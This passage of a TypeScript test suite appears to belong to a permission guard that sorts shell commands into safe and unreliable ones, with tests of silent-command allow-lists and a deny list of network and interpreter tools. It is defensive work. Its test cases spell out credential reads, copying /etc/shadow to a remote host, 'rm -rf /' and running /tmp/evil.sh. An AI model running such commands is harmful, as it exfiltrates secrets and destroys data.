  // Second form: multiple commands in body, all read-only.
  const r = extractBashTargets(`for f in a b; do find "$f" -type f; echo "$f"; done`, PROJ);
  assert.equal(r.reliable, true);
});

// --- BT-S12..BT-S16: forwarder expansion to first stage + upstream (Phase 5) ---

test("BT-S12: first-stage xargs with write downstream is forwarding_command", () => {
  // Previously missed by non-first-stage loop; now caught at i=0.
  const r = extractBashTargets("xargs rm -rf", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "forwarding_command");
});

test("BT-S13: first-stage xargs with read-only downstream is reliable", () => {
  // First-stage xargs with a read-only, statically determinable downstream
  // is exempt — the forwarder is safe to unroll.
  const r = extractBashTargets("xargs grep pattern", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S14: upstream find -exec + downstream xargs cat is forwarding_command", () => {
  // Upstream `find -exec rm` contains a write flag; downstream xargs cat is
  // read-only but the upstream write flag invalidates the exemption.
  const r = extractBashTargets("find . -exec rm {} \\; | xargs cat", PROJ);
  assert.equal(r.reliable, false);
  // find_write_flag fires first (before forwarder guard) — either reason
  // satisfies the security requirement, but scan order is find_write_flag.
  if (!r.reliable) {
    assert.equal(r.reason, "find_write_flag");
  }
});

test("BT-S15: upstream find -name + downstream xargs grep is reliable", () => {
  // Upstream find with filter-only args is read-only; downstream xargs grep
  // is read-only with a static arg. Both stages are safe.
  const r = extractBashTargets(`find . -name "*.ts" | xargs grep pattern`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S16: upstream cat + downstream xargs rm is forwarding_command", () => {
  // Upstream cat is read-only, but the current stage's downstream (rm) is a
  // write command — the forwarder guard fires.
  const r = extractBashTargets("cat /etc/passwd | xargs rm", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "forwarding_command");
});

// --- Forwarder chain edge cases ---

test("BT-S-extra: forwarder chain xargs-cat | xargs-grep is reliable", () => {
  // Both stages are forwarders with read-only downstreams.
  const r = extractBashTargets("xargs cat | xargs grep pattern", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S-extra: forwarder chain xargs-rm | xargs-cat is forwarding_command", () => {
  // First stage's downstream is rm (write); second stage's upstream is a
  // write-first-stage forwarder → isForwarderStageSafe returns false.
  const r = extractBashTargets("xargs rm -rf | xargs cat", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "forwarding_command");
});

test("BT-S-extra: xargs with only flags (no downstream) is reliable", () => {
  // Regression coverage for BTP7 semantics extended to first-stage xargs:
  // `xargs --help` has no real downstream command, so no execution happens.
  const r = extractBashTargets("xargs --help", PROJ);
  assert.equal(r.reliable, true);
});

// --- For-loop iteration-set glob bounded-safety (for-loop-iteration-glob-bounded) ---

test("BMG88: for-loop iteration-set glob + read-only ls body is reliable", () => {
  // The user's original case: listing archive entries.
  const r = extractBashTargets('for d in openspec/specs/*/; do ls "$d"; done', PROJ);
  assert.equal(r.reliable, true);
});

test("BMG89: for-loop iteration-set glob prefix outside project is unreliable", () => {
  const r = extractBashTargets('for d in /etc/*/; do ls "$d"; done', PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG90: for-loop iteration-set glob + write body is unreliable", () => {
  const r = extractBashTargets('for d in openspec/specs/*/; do rm "$d"; done', PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG91: for-loop iteration-set glob + cat body is reliable", () => {
  const r = extractBashTargets('for d in openspec/specs/*/; do cat "$d"; done', PROJ);
  assert.equal(r.reliable, true);
});

test("BMG92: for-loop iteration-set glob + echo body is reliable", () => {
  // echo is a HARMLESS_BUILTIN.
  const r = extractBashTargets('for d in openspec/specs/*/; do echo "$d"; done', PROJ);
  assert.equal(r.reliable, true);
});

test("BMG93: for-loop iteration-set glob + multi-command read-only body is reliable", () => {
  // Multiple commands separated by `;` inside the body, all read-only.
  const r = extractBashTargets('for f in openspec/changes/archive/*/; do echo "=== $f ==="; grep -n "^## " "$f"; done', PROJ);
  assert.equal(r.reliable, true);
});

test("BMG94: for-loop iteration-set glob + body glob is unreliable", () => {
  // BODY contains an unquoted glob (`"$d"/*.md`) — the `$d` prefix cannot
  // be statically resolved, so the body glob still triggers glob_expansion.
  const r = extractBashTargets('for d in openspec/specs/*/; do ls "$d"/*.md; done', PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG95: for-loop incomplete structure is unreliable", () => {
  // Missing `; done` — for-loop structure is incomplete.
  const r = extractBashTargets('for d in openspec/specs/*/; do ls "$d"', PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BMG96: for-loop iteration-set with literal words still goes through literal path", () => {
  // Iteration set has no glob — this is the "字面量 for 循环豁免" path,
  // not the bounded-glob path. The command is reliable because the
  // literal-iteration exemption applies.
  const r = extractBashTargets('for i in a b c; do echo "$i"; done', PROJ);
  assert.equal(r.reliable, true);
});

// --- BT-S21..BT-S24: for-loop iteration-set glob with empty prefix (empty-prefix-for-glob-readonly) ---
//
// These tests cover the empty-prefix relaxation for for-loop iteration-set
// globs. `for x in *.log; do wc -l "$x"; done` has an empty prefix (the
// glob is the entire iteration word) and is relative (not `/`, `~`, or a
// Windows drive letter) — under the cwd == projectRoot assumption, the
// shell expands `*.log` inside projectRoot, so it is bounded-safe.
//
// Non-empty prefixes already go through isBoundedPrefix (BMG88-96 cover
// the non-empty cases). Absolute prefixes (`/etc/*.conf`, `~/*.conf`) and
// write bodies (`rm`) remain rejected.

test("BT-S21: for-loop iteration-set glob empty prefix + read-only wc body is reliable", () => {
  // The user's original case: `for x in *.log; do wc -l "$x"; done`.
  // Empty prefix (glob is the whole iteration word) + relative word +
  // read-only body → bounded-safe under cwd == projectRoot assumption.
  const r = extractBashTargets(`for x in *.log; do wc -l "$x"; done`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S22: for-loop iteration-set glob empty prefix + write body is unreliable", () => {
  // Body is `rm` — write command, isForBodyReadOnly returns false.
  // Empty-prefix relaxation does not apply to write bodies.
  const r = extractBashTargets(`for x in *.log; do rm "$x"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BT-S23: for-loop iteration-set glob absolute prefix is unreliable", () => {
  // Empty prefix, but iteration word starts with `/` — absolute path,
  // cannot be bounded to projectRoot. Empty-prefix relaxation checks the
  // first char and rejects `/`.
  const r = extractBashTargets(`for f in /etc/*.conf; do cat "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BT-S24: for-loop iteration-set glob home prefix is unreliable", () => {
  // Empty prefix, but iteration word starts with `~` — home-relative path,
  // expands outside projectRoot. isBoundedPrefix rejects `~` prefix.
  const r = extractBashTargets(`for f in ~/*.conf; do cat "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BT-S25: for-loop iteration-set glob Windows drive letter prefix is unreliable", () => {
  // Empty prefix, but iteration word starts with a Windows drive letter
  // (`C:`) — absolute path on Windows, expands outside projectRoot.
  // isBoundedPrefix rejects `C:/` prefix (toAbsolutePath resolves it outside
  // projectRoot, isInside returns false). Pins the Windows drive-letter
  // rejection path so a future change to toAbsolutePath doesn't silently
  // bypass it.
  const r = extractBashTargets(`for f in C:/*.conf; do cat "$f"; done`, PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "glob_expansion");
});

test("BT-S24b: for-loop iteration-set glob empty prefix + cat body is reliable", () => {
  // Second read-only body form: `cat` is in READ_ONLY_COMMANDS.
  const r = extractBashTargets(`for x in *.ts; do cat "$x"; done`, PROJ);
  assert.equal(r.reliable, true);
});

test("BT-S24c: for-loop iteration-set glob non-empty prefix + relative word still reliable", () => {
  // `./` prefix is non-empty and relative — already covered by BMG88-96
  // semantics (non-empty prefix goes through isBoundedPrefix). This test
  // pins the boundary between empty-prefix and non-empty-prefix paths.
  const r = extractBashTargets(`for x in ./*.log; do wc -l "$x"; done`, PROJ);
  assert.equal(r.reliable, true);
});

// ============================================================
// Phase 1 (bash-stage-b-security-fixes): helper tests for
// isSilentCommand, UNRELIABLE_COMMANDS, isAnyUnreliableCommand,
// tokenizeBashCommand, looksLikePathToken.
// These tests pin the helper semantics; main-flow integration
// is covered by Phase 4/5 tests.
// ============================================================

import {
  SILENT_COMMANDS as SILENT_MAP,
  UNRELIABLE_COMMANDS,
  isSilentCommand,
  isAnyUnreliableCommand,
  tokenizeBashCommand,
  looksLikePathToken,
} from "../src/lib/bash-extract/index.ts";

// -------- isSilentCommand --------

test("BT-B14: isSilentCommand recognizes git status", () => {
  assert.equal(isSilentCommand("git", ["status"]), true);
});

test("BT-B14b: isSilentCommand recognizes git log with flags", () => {
  assert.equal(isSilentCommand("git", ["log", "--oneline", "-n", "10"]), true);
});

test("BT-B14c: isSilentCommand recognizes npm test", () => {
  assert.equal(isSilentCommand("npm", ["test"]), true);
});

test("BT-B14d: isSilentCommand recognizes yarn lint", () => {
  assert.equal(isSilentCommand("yarn", ["lint"]), true);
});

test("BT-B14e: isSilentCommand recognizes pnpm audit", () => {
  assert.equal(isSilentCommand("pnpm", ["audit"]), true);
});

test("BT-B14f: isSilentCommand recognizes openspec status", () => {
  assert.equal(isSilentCommand("openspec", ["status", "--change", "foo", "--json"]), true);
});

test("BT-B14g: isSilentCommand recognizes tsc with flags only", () => {
  assert.equal(isSilentCommand("tsc", ["--noEmit"]), true);
});

test("BT-B14h: isSilentCommand rejects cargo check (cargo no longer in SILENT_COMMANDS)", () => {
  // After Change A review feedback (P1): cargo was removed from
  // SILENT_COMMANDS because allowing `cargo check`/`metadata` re-opened
  // 4b D6 fall-through bypasses on compound commands and `--manifest-path`
  // reads. All cargo invocations now go through UNRELIABLE_COMMANDS.
  assert.equal(isSilentCommand("cargo", ["check"]), false);
});

test("BT-B14i: isSilentCommand recognizes go version", () => {
  assert.equal(isSilentCommand("go", ["version"]), true);
});

test("BT-B14j: isSilentCommand rejects cargo metadata (cargo no longer in SILENT_COMMANDS)", () => {
  // See BT-B14h rationale.
  assert.equal(isSilentCommand("cargo", ["metadata"]), false);
});

test("BT-B14k: isSilentCommand rejects npx --yes form (Change C: requires --no-install)", () => {
  // Under Change C (bash-extractor-side-effect-tools-silent), `npx` requires
  // `--no-install` to enter the silent path (D4). `npx --yes` (no
  // --no-install, no package name) does not qualify — even with `--yes`
  // suppressing prompts, npx may still fetch a package from the registry.
  // Pre-Change C this was silent via the "strict flag-only" mode 2; the
  // Change C special case supersedes that path.
  assert.equal(isSilentCommand("npx", ["--yes"]), false);
});

test("BT-B14-l: isSilentCommand rejects git log with bare path", () => {
  // `git log /etc/passwd` — `/etc/passwd` is not in git's allow-set
  assert.equal(isSilentCommand("git", ["log", "/etc/passwd"]), false);
});

test("BT-B14-m: isSilentCommand rejects npm run build", () => {
  // `npm run build` — `run` is NOT in npm's allow-set (deliberate — `npm run` executes arbitrary shell)
  assert.equal(isSilentCommand("npm", ["run", "build"]), false);
});

test("BT-B14-n: isSilentCommand rejects npx <pkg>", () => {
  // `npx prettier` — `prettier` is NOT in npx's allow-set
  assert.equal(isSilentCommand("npx", ["prettier"]), false);
});

test("BT-B14-o: isSilentCommand rejects make -f /tmp/evil.mk", () => {
  // make has empty allow-set; any non-flag token makes it non-silent
  assert.equal(isSilentCommand("make", ["-f", "/tmp/evil.mk"]), false);
});

test("BT-B14-p: isSilentCommand rejects rg pattern /etc/shadow", () => {
  // rg has empty allow-set; bare path token is not a silent form
  assert.equal(isSilentCommand("rg", ["pattern", "/etc/shadow"]), false);
});

test("BT-B14-q: isSilentCommand rejects jq . /etc/shadow", () => {
  // jq has empty allow-set
  assert.equal(isSilentCommand("jq", [".", "/etc/shadow"]), false);
});

test("BT-B14-r: isSilentCommand rejects cargo run", () => {
  // cargo's allow-set is {check, metadata}; run is not in it
  assert.equal(isSilentCommand("cargo", ["run", "--manifest-path", "/tmp/x/Cargo.toml"]), false);
});

test("BT-B14-s: isSilentCommand rejects go run", () => {
  // go's allow-set is {version, env}
  assert.equal(isSilentCommand("go", ["run", "./cmd/main.go"]), false);
});

test("BT-B14-t: isSilentCommand accepts openspec with flags only (empty-set semantics)", () => {
  // openspec has empty allow-set — empty-set means "any subcommand is silent"
  assert.equal(isSilentCommand("openspec", ["--help"]), true);
});

test("BT-B14-u: isSilentCommand rejects unknown command", () => {
  assert.equal(isSilentCommand("kubectl", ["exec", "pod", "--", "cat", "/etc/shadow"]), false);
  assert.equal(isSilentCommand("unknowncmd", ["foo"]), false);
});

test("BT-B14-v: isSilentCommand handles -- separator (git -- foo treated as silent)", () => {
  // `git -- foo` — after -- everything is positional; git allow-set doesn't require subcommand match when -- is present
  // Semantically `git -- foo` means "run git with no subcommand and arg `foo`"; this is `git --version`-like flag-only
  assert.equal(isSilentCommand("git", ["--", "foo"]), false);
});

test("BT-B14-w: isSilentCommand accepts git with only flags (no subcommand)", () => {
  // git --version — git's allow-set is non-empty, but flag-only invocation means "query version" — silent
  assert.equal(isSilentCommand("git", ["--version"]), true);
});

test("BT-B14-x: isSilentCommand rejects tsc with no args (Change C: requires entry flag)", () => {
  // Under Change C (bash-extractor-side-effect-tools-silent), `tsc` requires
  // an entry flag (`--noEmit`/`--version`/`--help`/`-h`) to enter the
  // silent path. `tsc` with no args executes the default tsconfig.json
  // build, which writes files to disk — not a silent-safe form.
  assert.equal(isSilentCommand("tsc", []), false);
});

test("BT-B14-y: SILENT_COMMANDS map has expected keys", () => {
  const keys = Object.keys(SILENT_MAP);
  for (const k of ["git", "npm", "yarn", "pnpm", "tsc", "go", "make", "rg", "jq", "openspec", "npx"]) {
    assert.ok(keys.includes(k), `expected ${k} in SILENT_COMMANDS`);
  }
  // cargo was removed in Change A — see BT-B14h rationale.
  assert.ok(!keys.includes("cargo"), `cargo should NOT be in SILENT_COMMANDS (kept in UNRELIABLE_COMMANDS)`);
});

// -------- UNRELIABLE_COMMANDS --------

test("BT-B16: UNRELIABLE_COMMANDS includes interpreters", () => {
  for (const cmd of ["sed", "awk", "perl", "python", "python2", "python3", "node", "nodejs", "ruby", "php", "lua", "deno", "bun"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRELIABLE_COMMANDS`);
  }
});

test("BT-B16-b: UNRELIABLE_COMMANDS includes system script executors", () => {
  for (const cmd of ["osascript", "powershell", "pwsh"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRELIABLE_COMMANDS`);
  }
});

test("BT-B16-c: UNRELIABLE_COMMANDS includes network tools", () => {
  for (const cmd of ["scp", "sftp", "rsync", "ssh", "telnet", "nc", "netcat", "ncat", "socat"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRELIABLE_COMMANDS`);
  }
});

test("BT-B16-d: UNRELIABLE_COMMANDS includes container/cloud tools", () => {
  for (const cmd of ["kubectl", "docker", "podman", "nerdctl", "crictl"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRECLIABLE_COMMANDS`);
  }
});

test("BT-B16-e: UNRELIABLE_COMMANDS includes shell meta commands", () => {
  for (const cmd of ["eval", "exec", "trap"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRELIABLE_COMMANDS`);
  }
});

test("BT-B16-f: UNRELIABLE_COMMANDS includes former-SILENT-with-risk tools", () => {
  // rg/jq/make/cargo/npx moved OUT of SILENT; must be in UNRELIABLE to avoid fail-open.
  // NB: an earlier draft of Change A removed `cargo` because `cargo check`
  // was in SILENT_COMMANDS.cargo's allow-set, but that re-opened 4b D6
  // fall-through bypasses on compound commands and `--manifest-path` reads.
  // Kept in UNRELIABLE — see BT-CARGO-1..11.
  for (const cmd of ["rg", "jq", "make", "cargo", "npx"]) {
    assert.ok(UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} in UNRELIABLE_COMMANDS`);
  }
});

test("BT-B16-g: UNRELIABLE_COMMANDS excludes benign commands", () => {
  for (const cmd of ["ls", "cat", "echo", "grep", "find", "git", "npm"]) {
    assert.ok(!UNRELIABLE_COMMANDS.has(cmd), `expected ${cmd} NOT in UNRELIABLE_COMMANDS`);
  }
});

// -------- isAnyUnreliableCommand --------

test("BT-B17: isAnyUnreliableCommand flags sed", () => {
  assert.equal(isAnyUnreliableCommand("sed -i 's/a/b/' /etc/passwd"), true);
});

test("BT-B17-b: isAnyUnreliableCommand flags python3 inline", () => {
  assert.equal(isAnyUnreliableCommand("python3 -c 'import os'"), true);
});

test("BT-B17-c: isAnyUnreliableCommand flags node -e", () => {
  assert.equal(isAnyUnreliableCommand("node -e 'require(\"fs\")'"), true);
});

test("BT-B17-d: isAnyUnreliableCommand flags osascript", () => {
  assert.equal(isAnyUnreliableCommand("osascript -e 'do shell script \"rm -rf /\"'"), true);
});

test("BT-B17-e: isAnyUnreliableCommand flags scp", () => {
  assert.equal(isAnyUnreliableCommand("scp /etc/shadow user@host:/tmp/"), true);
});

test("BT-B17-f: isAnyUnreliableCommand flags ssh", () => {
  assert.equal(isAnyUnreliableCommand("ssh user@host 'cat /etc/shadow'"), true);
});

test("BT-B17-g: isAnyUnreliableCommand flags kubectl", () => {
  assert.equal(isAnyUnreliableCommand("kubectl exec pod -- cat /etc/shadow"), true);
});

test("BT-B17-h: isAnyUnreliableCommand flags docker", () => {
  assert.equal(isAnyUnreliableCommand("docker run alpine sh -c 'cat /etc/shadow'"), true);
});

test("BT-B17-i: isAnyUnreliableCommand flags eval", () => {
  assert.equal(isAnyUnreliableCommand("eval 'rm -rf /'"), true);
});

test("BT-B17-j: isAnyUnreliableCommand flags path-prefixed command", () => {
  assert.equal(isAnyUnreliableCommand("/usr/bin/sed -i 's/a/b/' /etc/passwd"), true);
});

test("BT-B17-k: isAnyUnreliableCommand flags 2nd fragment", () => {
  // `git status && sed -i 'x' /etc/passwd` — second fragment first-command is sed
  assert.equal(isAnyUnreliableCommand("git status && sed -i 'x' /etc/passwd"), true);
});

test("BT-B17-l: isAnyUnreliableCommand flags rsync", () => {
  assert.equal(isAnyUnreliableCommand("rsync -a /etc/ host:/tmp/"), true);
});

test("BT-B17-m: isAnyUnreliableCommand does NOT flag benign commands", () => {
  assert.equal(isAnyUnreliableCommand("ls /tmp"), false);
  assert.equal(isAnyUnreliableCommand("echo hi"), false);
  assert.equal(isAnyUnreliableCommand("cat /etc/passwd"), false);
  assert.equal(isAnyUnreliableCommand("git status"), false);
  assert.equal(isAnyUnreliableCommand("npm test"), false);
});

test("BT-B17-n: isAnyUnreliableCommand does NOT flag command inside string", () => {
  // `echo "sed -i"` — sed is string argument to echo, not a command name
  assert.equal(isAnyUnreliableCommand("echo \"sed -i\""), false);
});

test("BT-B17-o: isAnyUnreliableCommand skips env/command wrapper prefixes", () => {
  // `env FOO=1 sed -i 'x' file` — env is wrapper, sed is the actual command
  assert.equal(isAnyUnreliableCommand("env FOO=1 sed -i 'x' file"), true);
});

// -------- tokenizeBashCommand --------

test("BT-B18: tokenizeBashCommand splits whitespace", () => {
  const tokens = tokenizeBashCommand("cat /etc/passwd && echo ok");
  assert.deepEqual(tokens, ["cat", "/etc/passwd", "&&", "echo", "ok"]);
});

test("BT-B18-b: tokenizeBashCommand handles quotes", () => {
  const tokens = tokenizeBashCommand("echo \"hello world\"");
  assert.deepEqual(tokens, ["echo", "hello world"]);
});

test("BT-B18-c: tokenizeBashCommand handles single quotes", () => {
  const tokens = tokenizeBashCommand("grep 'hello world' file.txt");
  assert.deepEqual(tokens, ["grep", "hello world", "file.txt"]);
});

test("BT-B18-d: tokenizeBashCommand keeps operators as separate tokens", () => {
  // `tokenize` treats `>` as its own token (space-separated). But `2>/tmp/err`
  // (no space between `2>` and the path) is a single token — tokenize does not
  // split operator from attached path. This matches bash lexing in that both
  // `echo x > /tmp/out` and `echo x 2>/tmp/err` are parsed correctly by the
  // redirect extractor (which is char-scanning).
  const tokens = tokenizeBashCommand("echo x > /tmp/out 2>/tmp/err");
  assert.deepEqual(tokens, ["echo", "x", ">", "/tmp/out", "2>/tmp/err"]);
});

// -------- looksLikePathToken --------

test("BT-B19: looksLikePathToken recognizes absolute path", () => {
  assert.equal(looksLikePathToken("/etc/passwd"), true);
  assert.equal(looksLikePathToken("/tmp/x.txt"), true);
});

test("BT-B19-b: looksLikePathToken recognizes home-prefixed path", () => {
  assert.equal(looksLikePathToken("~/.ssh/id_rsa"), true);
});

test("BT-B19-c: looksLikePathToken recognizes relative path", () => {
  assert.equal(looksLikePathToken("./file.txt"), true);
  assert.equal(looksLikePathToken("../file.txt"), true);
  assert.equal(looksLikePathToken("file.txt"), true);
});

test("BT-B19-d: looksLikePathToken rejects plain command words", () => {
  assert.equal(looksLikePathToken("cat"), false);
  assert.equal(looksLikePathToken("sed"), false);
  assert.equal(looksLikePathToken("--flag"), false);
  assert.equal(looksLikePathToken("-f"), false);
});

test("BT-B19-e: looksLikePathToken rejects shell operators", () => {
  assert.equal(looksLikePathToken("&&"), false);
  assert.equal(looksLikePathToken("||"), false);
  assert.equal(looksLikePathToken(";"), false);
  assert.equal(looksLikePathToken("|"), false);
});

test("BT-B19-f: looksLikePathToken rejects unresolved variable references", () => {
  assert.equal(looksLikePathToken("$VAR/file"), false);
  assert.equal(looksLikePathToken("$VAR"), false);
});

test("BT-B19-g: looksLikePathToken rejects empty", () => {
  assert.equal(looksLikePathToken(""), false);
});

// -------- helper composition: C1 payload coverage via helper alone --------

test("BT-B20: isSilentCommand rejects ALL C1 payloads", () => {
  // C1 SILENT_COMMANDS 过宽 — 所有 payload 必须返回 false
  const cases: Array<[string, string[]]> = [
    ["npm", ["run", "build"]],
    ["git", ["log", "/etc/passwd"]],
    ["rg", ["pattern", "/etc/shadow"]],
    ["jq", [".", "/etc/shadow"]],
    ["make", ["-f", "/tmp/evil.mk"]],
    ["cargo", ["run", "--manifest-path", "/tmp/x/Cargo.toml"]],
  ];
  for (const [cmd, args] of cases) {
    assert.equal(isSilentCommand(cmd, args), false, `expected ${cmd} ${args.join(" ")} to be non-silent`);
  }
});

test("BT-B21: isSilentCommand accepts legitimate C1-adjacent cases", () => {
  const cases: Array<[string, string[]]> = [
    ["git", ["status"]],
    ["git", ["log", "--oneline", "-n", "10"]],
    // Note: `git diff HEAD~1` is deliberately NOT silent under the strict
    // "no positional after subcommand" rule — a positional after a subcommand
    // could be a bare path. Users who want silent diff run `git diff` alone.
    ["git", ["diff"]],
    ["npm", ["test"]],
    ["npm", ["lint"]],
    ["npm", ["audit"]],
  ];
  for (const [cmd, args] of cases) {
    assert.equal(isSilentCommand(cmd, args), true, `expected ${cmd} ${args.join(" ")} to be silent`);
  }
});

test("BT-B21b: isSilentCommand accepts git diff HEAD~1 (Change B: revision expression positional)", () => {
  // Under Change B (bash-extractor-false-positive-trim), git read-only
  // subcommands accept positional args that match either git blob syntax
  // or a repo-relative path. `HEAD~1` is neither a blob syntax nor a repo
  // relative path per the D2 rules, but the isSilentCommand post-subcommand
  // branch (pre-Change B) already allowed revision-like bare words for git
  // — the pre-Change B `git log HEAD~1` was already silent via that branch.
  // Kept as silent under Change B. See BT-BLOB-9 for the rev-parse variant.
  assert.equal(isSilentCommand("git", ["diff", "HEAD~1"]), true);
});

// ============================================================
// Phase 2 (bash-stage-b-security-fixes): `<` input redirect.
// BT-B19..BT-B21 in proposal's scenario→test coverage ledger.
// These are main-flow tests via extractBashTargets; the underlying
// helper (extractRedirects) is not exported — we exercise it through
// the public API.
// ============================================================

test("BT-B22: bash < /tmp/evil.sh extracts read target", () => {
  // `<` input redirect — target is a read path.
  const r = extractBashTargets("bash < /tmp/evil.sh", PROJ);
  // bash < /tmp/evil.sh — bash is a shell forwarder via shell_forwarder guard
  // when it has a non-flag positional arg. But here `< /tmp/evil.sh` is a
  // redirect target, not a positional arg, so bash is NOT a forwarder by
  // the "script path as positional" rule. However, the shell-forwarder
  // check in isShellForwarder looks at `tokens` where `<` and `/tmp/evil.sh`
  // are two separate tokens, and `tokens[1] === "<"` (a non-flag positional
  // starts with `.` so not a flag), which means after Phase 3 lands, this
  // will hit shell_forwarder. For now (before Phase 3), this test asserts
  // the `<` extraction: if extraction succeeds, we expect a read target for
  // /tmp/evil.sh. If it returns unreliable, we assert the reason is shell_forwarder.
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.action === "read" && t.path === "/tmp/evil.sh"),
      `expected read target /tmp/evil.sh, got ${JSON.stringify(r.targets)}`,
    );
  } else {
    // shell_forwarder is acceptable post-Phase 3
    assert.equal(r.reason, "shell_forwarder");
  }
});

test("BT-B23: diff < /etc/passwd < /etc/hosts extracts two read targets", () => {
  // Two `<` input redirects — each extracted as a read target.
  const r = extractBashTargets("diff < /etc/passwd < /etc/hosts", PROJ);
  if (r.reliable) {
    const readPaths = r.targets.filter((t) => t.action === "read").map((t) => t.path);
    assert.ok(readPaths.includes("/etc/passwd"), `expected /etc/passwd in ${readPaths}`);
    assert.ok(readPaths.includes("/etc/hosts"), `expected /etc/hosts in ${readPaths}`);
  }
});

test("BT-B24: awk '{print}' < /etc/shadow — `<` extracted as read target (or unreliable_command post-Phase-5)", () => {
  // awk is in UNRELIABLE_COMMANDS (Phase 1). The unreliable_command guard
  // runs BEFORE target extraction and is wired in Phase 5. Until then, this
  // returns reliable + a read target for /etc/shadow. Both outcomes are
  // acceptable — we just assert that the `<` extraction produced the read
  // target (proving extractRedirects handles `<`) OR that Phase 5 has
  // landed and produced unreliable_command.
  const r = extractBashTargets("awk '{print}' < /etc/shadow", PROJ);
  if (!r.reliable) {
    assert.equal(r.reason, "unreliable_command");
    return;
  }
  assert.ok(
    r.targets.some((t) => t.action === "read" && t.path === "/etc/shadow"),
    `expected read target /etc/shadow, got ${JSON.stringify(r.targets)}`,
  );
});

test("BT-B24b: cat <<EOF heredoc still unreliable (not treated as `<`)", () => {
  // `<<` is heredoc start, NOT input redirect — scanUnreliable catches it.
  const r = extractBashTargets("cat <<EOF\nhello\nEOF", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    // Some scanner will pick this up as heredoc or another reason
    assert.ok(typeof r.reason === "string" && r.reason.length > 0);
  }
});

test("BT-B24c: `<>` read-write mode is not extracted as read or write", () => {
  // `<>` is bash's rare read-write mode; this change doesn't handle it.
  // The `<>` should NOT produce a read target (only `<` alone triggers read).
  const r = extractBashTargets("cat <>/tmp/x", PROJ);
  if (r.reliable) {
    // No read target for /tmp/x from `<>` — the redirect extractor skips `<>`.
    // (cat isn't in UNRELIABLE_COMMANDS and has no positional path here.)
    const readPaths = r.targets.filter((t) => t.action === "read").map((t) => t.path);
    assert.equal(readPaths.includes("/tmp/x"), false);
  }
});

test("BT-B24d: 0< fd input redirect extracts read target", () => {
  // fd-numbered input redirect `0<` — same semantics as bare `<`.
  const r = extractBashTargets("cat 0< /etc/passwd", PROJ);
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.action === "read" && t.path === "/etc/passwd"),
      `expected read target /etc/passwd, got ${JSON.stringify(r.targets)}`,
    );
  }
});

// ============================================================
// Phase 3 (bash-stage-b-security-fixes): shell_forwarder
// extension — script paths, source, dot-source. BT-B15..BT-B18
// in proposal's scenario→test coverage ledger.
// ============================================================

test("BT-B15: bash /tmp/evil.sh is shell_forwarder", () => {
  const r = extractBashTargets("bash /tmp/evil.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B16: bash -x /tmp/evil.sh is shell_forwarder", () => {
  // `-x` is a flag; `/tmp/evil.sh` is a positional script path.
  const r = extractBashTargets("bash -x /tmp/evil.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B17: source /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("source /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B18: . /tmp/x.sh (dot-source) is shell_forwarder", () => {
  const r = extractBashTargets(". /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B15b: env bash /tmp/evil.sh is shell_forwarder", () => {
  // env wrapper + shell with positional script path
  const r = extractBashTargets("env FOO=1 bash /tmp/evil.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B17b: env source /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("env FOO=1 source /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B16b: bash --version is NOT shell_forwarder (flag-only)", () => {
  const r = extractBashTargets("bash --version", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B16c: bash -h is NOT shell_forwarder (flag-only)", () => {
  const r = extractBashTargets("bash -h", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B16d: bash -x alone (no positional) is NOT shell_forwarder", () => {
  // `-x` is a trace flag with no positional script path.
  // Rare usage but the rule is clear: no positional → not a forwarder.
  const r = extractBashTargets("bash -x", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B17c: source alone (no arg) is NOT shell_forwarder", () => {
  const r = extractBashTargets("source", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B18b: `which bash` / `echo bash` is NOT shell_forwarder", () => {
